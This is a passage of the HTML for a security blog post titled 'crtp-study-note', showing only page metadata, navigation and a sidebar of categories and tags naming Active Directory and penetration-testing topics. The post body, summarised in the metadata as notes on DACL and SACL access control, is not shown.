<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>crtp-study-note | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="01 DACLacl分为两种类型，DACL 和 SACL DACL  控制访问权限 ACE包含（拒绝访问&#x2F;允许） 直接决定权限  SACL  日志&#x2F;审计记录 行为记录 失败&#x2F;成功的行为记录  1.用户多个权限场景的DACL匹配以下为例，当有两个 用户A 用户B     A用户 B用户    Andrew Jane   GROUP-A GROUP-A   GROUP-B">
<meta property="og:type" content="article">
<meta property="og:title" content="crtp-study-note">
<meta property="og:url" content="http://example.com/2024/12/20/crtp-study-note/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="01 DACLacl分为两种类型，DACL 和 SACL DACL  控制访问权限 ACE包含（拒绝访问&#x2F;允许） 直接决定权限  SACL  日志&#x2F;审计记录 行为记录 失败&#x2F;成功的行为记录  1.用户多个权限场景的DACL匹配以下为例，当有两个 用户A 用户B     A用户 B用户    Andrew Jane   GROUP-A GROUP-A   GROUP-B">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2025/crtp-study-note/background.jpg">
<meta property="article:published_time" content="2024-12-20T11:40:41.000Z">
<meta property="article:modified_time" content="2025-06-05T17:41:53.499Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="AD">
<meta property="article:tag" content="crtp">
<meta property="article:tag" content="note">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2025/crtp-study-note/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">13</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">10</div>
            </a>
        <div class="children"><div class="category-box">
            <a class="category-link" href="/categories/ctf/wiz/">
                wiz
                <div class="category-count">2</div>
            </a>
        </div></div>
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-8/">
                htb-Season-8
                <div class="category-count">3</div>
            </a>
        </div>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ADCS/" rel="tag">ADCS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Below/" rel="tag">Below</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CI-CD/" rel="tag">CI&#x2F;CD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2022-29623/" rel="tag">CVE-2022-29623</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CreateChild/" rel="tag">CreateChild</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Dacl/" rel="tag">Dacl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKI-ADMIN/" rel="tag">PKI ADMIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyside2/" rel="tag">Pyside2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube/" rel="tag">Roundcube</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Self/" rel="tag">Self</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TeamCity/" rel="tag">TeamCity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Teamcity/" rel="tag">Teamcity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tombstone/" rel="tag">Tombstone</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure/" rel="tag">azure</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc15/" rel="tag">esc15</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mysqljs/" rel="tag">mysqljs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/owa/" rel="tag">owa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pdf/" rel="tag">pdf</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pinns/" rel="tag">pinns</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgres/" rel="tag">postgres</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li 